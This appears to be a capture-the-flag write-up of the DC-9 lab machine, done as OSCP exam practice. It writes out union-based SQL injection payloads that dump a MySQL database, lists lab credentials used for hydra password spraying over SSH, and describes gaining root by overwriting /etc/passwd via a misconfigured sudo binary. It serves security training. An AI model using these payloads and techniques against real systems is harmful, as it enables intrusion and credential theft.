# DC-9

## Background

> The war wages onward 

- Author: Darren

- Released on: Jun 30, 2022

- Difficulty: Intermediate

- Overall difficulty for me: Easy
    - Initial foothold: Easy (If I didn't accidentally skiped one vulnerability, it'll be medium.)
    - Privilege Escalation: Easy

> In this machine, I'm not using Offensive Security's Proving Grounds Play to interact with this machine, as I have some trouble the VPN. Hence, I downloaded the virtual machine image and imported to my VMWare Workstation.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a0.png)

# Service Enumeration

Since we don't know the target machine's IP yet, I'll confirm my attacker machine IP and subnet:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a1.png)

Then, we can use `nmap` to do ping sweep:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a2.png)

Found the target machine's IP: `192.168.183.129`

Then, we can scan the machine for open ports via `rustscan`!

**Rustscan Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a3.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a4.png)

According to `rustscan` result, we have 1 port is opened:

Ports Open        | Service
------------------|------------------------
80                | Apache httpd 2.4.38

## HTTP on Port 80

In the `search.php`, it's vulnerable to SQL Injection!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a6.png)

> Since I'm practicing OSCP Exam environment, I'll do this manually, as SQLMap is prohibited in OSCP Exam.

First, let's test it suffers which type of SQL Injection, such as Union-based, Time-based, Error-based, etc.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a8.png)

**Full SQL Query:**
```sql
' UNION ALL SELECT 1,2,3,4,5,6-- -
```

Looks like it **suffers Union-based SQL Injection**!

Let's **enumerate the entire DBMS(Database Management System)** via SQL Injection!

**First, let's find out which DBMS is running on the target machine!** 
```sql
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,@@version-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a9.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a10.png)

We can confirm that the DBMS that the target machine's running is `MySQL`.

**Then, we can list the current database name:**
```sql
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,database()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a12.png)

- Current database name:`Staff`

**Next, we can list all database names:**
```sql
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,concat(schema_name) FROM information_schema.schemata-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a11.png)

- All database names:`information_schema`, `Staff`, `users`

**Since database `users` seems to be interesting, let's enumerate it's tables first:**
```sql
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='users'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a13.png)

- Database `users`'s table name:`UserDetails`

**List database `users`'s column names:**
```sql
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='UserDetails'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a14.png)

- Database `users`'s column names:`id`, `firstname`, `lastname`, `username`, `password`, `reg_date`

**Hmm... `username` and `password` seems interesting, let's retrieve their data:**
```sql
' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,concat(username,0x3a,password) FROM users.UserDetails-- -
```

> Note: `0x3a` means `:`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a15.png)

**Credentials:**
```
marym:3kfs86sfd
julied:468sfdfsd2
fredf:4sfd87sfd1
barneyr:RocksOff
tomc:TC&TheBoyz
jerrym:B8m#48sd
wilmaf:Pebbles
bettyr:BamBam01
chandlerb:UrAG0D!
joeyt:Passw0rd
rachelg:yN72#dsd
rossg:ILoveRachel
monicag:3248dsds7s
phoebeb:smellycats
scoots:YR3BVxxxw87
janitor:Ilovepeepee
janitor2:Hawaii-Five-0
```

In the `manage.php`, there is a login form:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a16.png)

I'll use `hydra` to do **password spraying**:

**userlist.txt:**
```
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

**passlist.txt:**
```
3kfs86sfd
468sfdfsd2
4sfd87sfd1
RocksOff
TC&TheBoyz
B8m#48sd
Pebbles
BamBam01
UrAG0D!
Passw0rd
yN72#dsd
ILoveRachel
3248dsds7s
smellycats
YR3BVxxxw87
Ilovepeepee
Hawaii-Five-0
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a17.png)

Nothing?? Alright, I should missed something at the beginning. I'll scan the target machine again in order to prevent missing some important ports:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a43.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a44.png)

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.9p1 Debian
80                | Apache httpd 2.4.38

Hmm... I missed the **`SSH`** port!

Now, let's password spraying to SSH then.

> After I rooted this machine, I found that there is a **Local File Inclusion(LFI)** vulnerability in `welcome.php`, and I found that it has a "port knocking". You can do it when you enumerated the `Staff` database.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a45.png)

> The SSH port will be open when we "knocked" port 7469,8475,9842. To do so, we can use the `knock` command:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a46.png)

> So I wasn't missed the SSH port, but missed the LFI part, and my `rustscan` accidentally "knocked" those ports, thus SSH port was opened when I scan the machine again.

# Initial Foothold

**Password Spraying to SSH:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a18.png)

- SSH credentials:
	- Username:chandlerb
	- Password:UrAG0D!

	- Username:joeyt
	- Password:Passw0rd

	- Username:janitor
	- Password:Ilovepeepee

Let's `ssh` into them!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a19.png)

# Privilege Escalation

## janitor to fredf

In `/var/www/html/config.php`, we can find there is a MySQL credentials:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a20.png)

- MySQL Username:dbuser
- MySQL Password:password

Let's find out what the database `Staff` has!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a21.png)

Seems like it's a hash! Let's use [crackstation](https://crackstation.net/) to crack it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a22.png)

- Username:admin
- Password:transorbital1

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a23.png)

Nothing after logged in as admin in `manage.php`.

In the `/opt` directory, there are 2 uncommon directories:`devstuff`, `scripts`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a24.png)

We can only access `devstuff`, so let's check it out:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a25.png)

Let's look at `test.py`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a26.png)

So, this python script allows me to read a file, then output to a file. Just like `cp` in Linux:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a27.png)

Hmm... Not useful for privilege escalation.

Okay. Take a step back. Since we found **3 users** that we can login to `ssh`, we should really **enumerate their home directory**, as all home directory are not world-readable.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a28.png)

**Let's login to `joeyt` first:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a29.png)

Nothing in `joeyt`.

**How about `janitor`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a30.png)

Found `.secrets-for-putin` hidden directory!!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a31.png)

**Password spraying again!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a32.png)

Found user `fredf` credentials!

- Username:fredf
- Password:B4-Tru3-001

Let's **Switch User** to `fredf`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a33.png)

## fredf to root

**Sudo Permission:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a34.png)

User `fredf` is able to run `/opt/devstuff/dist/test/test` as root!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a35.png)

This time however, we can escalate to root! Since we have root privilege to overwrite `/etc/passwd`!

- Copy `/etc/passwd` and paste it to `/tmp`, and add a new user with root privilege:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a36.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a39.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a37.png)

- Overwrite the `/etc/passwd`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a38.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a40.png)

- Switch User to the newly create user:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a41.png)

And we're root! :D

# Rooted

**theflag.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/DC-9/images/a42.png)

# Conclusion

What we've learned:

1. MySQL Union-based SQL Injection
2. Local File Inclusion
3. Port Knocking
4. Password Spraying
5. Privilege Escalation via Cleartext Crendentials
6. Privilege Escalation via Misconfigured Sudo Permission